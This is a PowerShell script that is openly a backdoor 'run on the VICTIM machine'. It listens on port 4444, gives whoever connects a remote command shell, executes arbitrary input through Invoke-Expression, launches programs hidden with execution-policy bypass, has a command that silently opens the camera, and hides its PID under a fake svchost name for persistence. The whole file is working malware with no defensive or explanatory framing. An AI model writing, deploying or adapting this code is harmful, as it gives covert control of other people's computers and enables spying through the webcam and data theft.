# listener.ps1 - Listens for incoming connection on port
# Run on the VICTIM machine - it listens and YOU connect to it

$port = 4444

# Create a hidden listener that waits for your connection
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $port)
$listener.Start()

# Write PID to a file so persistence scripts can find it
$pid | Out-File "$env:ProgramData\svchost.pid" -Force

while ($true) {
    try {
        $client = $listener.AcceptTcpClient()
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        $writer.WriteLine("Connected to $env:COMPUTERNAME\$env:USERNAME")
        $writer.Write("PS $($pwd.Path)> ")
        $writer.Flush()
        
        while ($client.Connected) {
            $line = $reader.ReadLine()
            if (-not $line) { break }
            
            $output = ""
            switch -Regex ($line.Trim()) {
                "^exit$" { $client.Close(); break }
                "^run (.+)$" {
                    $cmd = $matches[1]
                    $psi = New-Object System.Diagnostics.ProcessStartInfo
                    $psi.FileName = "powershell.exe"
                    $psi.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -Command `"$cmd`""
                    $psi.WindowStyle = 'Hidden'
                    $psi.CreateNoWindow = $true
                    $psi.UseShellExecute = $false
                    [System.Diagnostics.Process]::Start($psi) | Out-Null
                    $output = "OK: $cmd launched hidden"
                }
                "^hidden (.+)$" {
                    $cmd = $matches[1]
                    $parts = $cmd.Split(' ', 2)
                    $psi = New-Object System.Diagnostics.ProcessStartInfo
                    $psi.FileName = $parts[0]
                    if ($parts.Count -gt 1) { $psi.Arguments = $parts[1] }
                    $psi.WindowStyle = 'Hidden'
                    $psi.CreateNoWindow = $true
                    $psi.UseShellExecute = $false
                    [System.Diagnostics.Process]::Start($psi) | Out-Null
                    $output = "OK: $cmd launched hidden"
                }
                "^camera$" {
                    Start-Process microsoft.windows.camera: -WindowStyle Hidden
                    $output = "Camera app launched"
                }
                default {
                    $output = Invoke-Expression $line 2>&1 | Out-String
                }
            }
            
            if ($client.Connected) {
                $writer.Write($output.Trim() + "`nPS $($pwd.Path)> ")
                $writer.Flush()
            }
        }
    } catch {
        # Connection dropped, wait for next
    }
    Start-Sleep -Seconds 1
}
